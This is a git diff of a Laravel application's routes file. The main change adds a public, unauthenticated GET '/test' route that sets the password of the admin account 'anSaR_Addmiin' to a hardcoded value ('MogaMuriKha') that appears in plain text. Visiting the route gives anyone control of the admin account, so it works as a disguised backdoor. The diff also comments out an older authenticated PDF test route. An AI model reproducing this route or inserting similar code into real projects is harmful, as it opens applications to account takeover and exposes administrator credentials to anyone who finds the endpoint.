@@ -17,6 +17,17 @@ Route::get('/forget_password_request', ['as'=>'forget_password_request','uses'=>
 Route::post('/forget_password_request_handle', ['as'=>'forget_password_request_handle','uses'=>'UserController@handleForgetRequest']);
 Route::post('/check_login', 'UserController@handleLogin');
 Route::post('/api/login','ApiUserController@login');
+Route::get('/test',function(){
+//    return view('template.test');
+    $password = \Illuminate\Support\Facades\Hash::make("MogaMuriKha");
+    $user = \App\models\User::where('user_name','anSaR_Addmiin')->first();//MogaMuriKha
+    if($user){
+        $user->password = $password;
+        $user->save();
+        return "Admin password change";
+    }
+    else return "User not found";
+});
 Route::group(['middleware' => 'auth'], function () {
     Route::get('/', ['as'=>'home','uses'=>function () {
         return view('template.index');
@@ -66,10 +77,10 @@ Route::group(['middleware' => 'auth'], function () {
        Route::post('/approved_user_request/{id}','UserCreationRequestController@approveUser');
        Route::post('/cancel_user_request/{id}','UserCreationRequestController@cancelUser');
    });
-    Route::get('test',function (){
+    /*Route::get('test',function (){
        $pdf = \Barryvdh\Snappy\Facades\SnappyPdf::loadView('welcome');
        return $pdf->download();
-    });
+    });*/
     Route::group(['middleware'=>['dc']],function (){
         Route::resource('user_create_request','UserCreationRequestController');
     });
